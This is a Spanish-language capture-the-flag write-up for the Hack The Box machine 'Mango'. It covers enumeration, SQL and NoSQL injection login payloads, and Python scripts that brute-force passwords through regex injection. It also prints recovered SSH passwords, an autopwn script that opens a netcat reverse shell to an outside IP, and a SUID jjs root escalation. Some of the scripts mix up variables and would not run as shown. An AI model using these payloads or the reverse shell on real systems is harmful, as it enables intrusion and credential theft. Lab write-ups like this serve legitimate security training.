---
layout: post
title: HTB_Mango
date: 2023/07/10
slug: HTB_Mango
heroImage: /assets/machines.jpg
---

# Mango {-}

## Introduccion {-}

La maquina del dia se llama Mango.

El replay del live se puede ver aqui

[![S4vitaar OpenAdmin maquina](https://img.youtube.com/vi/DvPh6BXdHgo/0.jpg)](https://www.youtube.com/watch?v=DvPh6BXdHgo)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.162
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.162
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.162 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,443 10.10.10.162 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 22     | tcp      | Conneccion directa | creds      |
| 80     | http     | Web, Fuzzing       |            |
| 443    | https    | Web, Fuzzing       |            |


El scaneo de nmap nos muestra 2 dominios 

- mango.htb
- staging-order.mango.htb

los añadimos al 
```bash
 /etc/hosts 
```


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.162
whatweb https://10.10.10.162
```

Es un Apache 2.4.29 en un Ubuntu. El puerto 80 nos muestra un 403 Forbiden pero no el 443.

#### Checkeamos el certificado ssl {-}

```bash
openssl s_client -connect 10.10.10.162:443
```

Nuevamente vemos el dominio 
```bash
 staging-order.mango.htb 
```


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.162 
```
, Vemos que no tenemos acceso. Si vamos con **https**, vemos una web stylo Google.
Ocure lo mismos con el dominio 
```bash
 mango.htb 
```
 pero con el dominio 
```bash
 staging-order.maquina.htb 
```
 por **http**, vemos un panel de inicio de 
session.

Aqui probamos cosas uzando el burpsuite.

```bash
username=admin&password=admin&login=login
username=admin'&password=admin&login=login
username=admin'&password=admin'&login=login
username=admin' or 1=1-- -&password=admin&login=login
username=admin' and sleep(5)-- -&password=admin&login=login
username=admin' and sleep(5)#&password=admin&login=login
username=admin' or sleep(5)#&password=admin&login=login
username=admin or sleep(5)#&password=admin&login=login
username=admin and sleep(5)#&password=admin&login=login
```

No parece ser vulnerable a SQLI.
## Vulnerability Assessment {-}


### NO SQLI {-}

El nombre de la maquina Mango nos hace pensar a Mango DB que uza NO SQL. Miramos en  [payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
para ver si se puede hacer algo con NO SQLI

```bash
username[$ne]=admin&password[$ne]=admin&login=login
```

Aqui vemos que la respuesta es differente de la precedente lo que quiere decir que es probable que seamos frente de una vulnerabilidad **NOSQLI**

Vamos a probar cosas con expressiones regulares

```bash
username[$regex]=^a&password[$ne]=admin&login=login
Respuesta : 302 Found

username[$regex]=^b&password[$ne]=admin&login=login
Respuesta : 200 Ok

username[$regex]=^ad&password[$ne]=admin&login=login
Respuesta : 302 Found

username[$regex]=^ab&password[$ne]=admin&login=login
Respuesta : 200 Ok
```

Suponiendo que existe un usuario admin, vemos que con expresiones regulares, cuando acertamos tenemos una respuesta a lado de servidor 302 y a cada error un 200.

Nos creamos un script en python para el NOSQLI

```python
#!/usr/bin/python3

import pdb # Debugging
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
characters = string.ascii_letters

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fase de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password[admin]")
    username = ""

    while True:
        for character in characters:

            p1.status("Probando con el caracter %c" % character)

            # NoSQL Injection
            post_data = {
                'username': f"^{username + character}",
                'password[$ne]':'admin',
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                username += character
                p2.status(password)
                break


if __name__ == '__main__':

    makeRequest()
```

Este pequeño script nos permite encontrar el usuario **admin** y el usuario **mango**.
Modificamos el script para encontrar la contraseñas de los usuarios.

```python
#!/usr/bin/python3

import pdb # Debugging
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
characters = string.ascii_letters + string.digits + string.punctuation

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fase de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password[admin]")
    password = ""

    while True:
        for character in characters:

            p1.status("Probando con el caracter %c" % character)

            # NoSQL Injection
            post_data = {
                'username': 'admin',
                'password[$regex]': f"^{re.escape(password + character)}",
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                username += character
                p2.status(password)
                break


if __name__ == '__main__':

    makeRequest()
```

Cambiando el usuario de admin a mango, tenemos las dos contraseñas. Como el login nos lleva a un **Under Plantation**, Miramos si nos podemos connectar por **ssh**## Vuln exploit & Gaining Access {-}

### Ganando accesso con ssh {-}

```bash
ssh admin@10.10.10.162
Password: t9KcS3>!0B#2

ssh mango@10.10.10.162
Password: h3mXK8RhU~f{]f5H
```

Hemos ganado accesso al systema como el usuario **mango**.
Vemos que la flag esta en el directorio 
```bash
 /home/admin 
```
 tenemos que pasar al usuario admin con el comando 
```bash
 su admin 
```
.

### Autopwn completo para el usuario mango {-}

```python
#!/usr/bin/python3

import pdb # Debugging
from pexpect import pxssh
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://staging-order.mango.htb"
characters = string.ascii_letters + string.digits + string.punctuation
lport = 443

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando fase de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Password[mango]")
    password = ""

    for x in range(0, 20):
        for character in characters:

            p1.status("Probando con el caracter %c" % character)

            # NoSQL Injection
            post_data = {
                'username': 'mango',
                'password[$regex]': f"^{re.escape(password + character)}",
                'login': 'login'
            }

            r = requests.post(main_url, data=post_data, allow_redirects=False)

            if r.status_code == 302:
                password += character
                p2.status(password)
                break

    return password

def sshConnection(username, password):

    s = pxssh.pxssh()
    s.login('10.10.10.162', username, password)
    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 >/tmp/f")
    s.prompt()
    s.logout()

if __name__ == '__main__':

    password = makeRequest()

    try:
        threading.Thread(target=sshConnection, args=('mango', password)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
```## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
find \-perm -4000 2>/dev/null
ls -la ./usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Aqui vemos que tenemos privilegios SUID sobre el binario 
```bash
 jjs 
```
 de java. Buscamos en [gtfobins](https://gtfobins.github.io/gtfobins/jjs/#suid)
como escalar el privilegio con jjs. 

```bash
echo "Java.type('java.lang.Runtime').getRuntime().exec('chmod 4755 /bin/bash').waitFor()" | jjs
bash -p
whoami
#Output
root
```

Ya podemos leer el **root.txt**

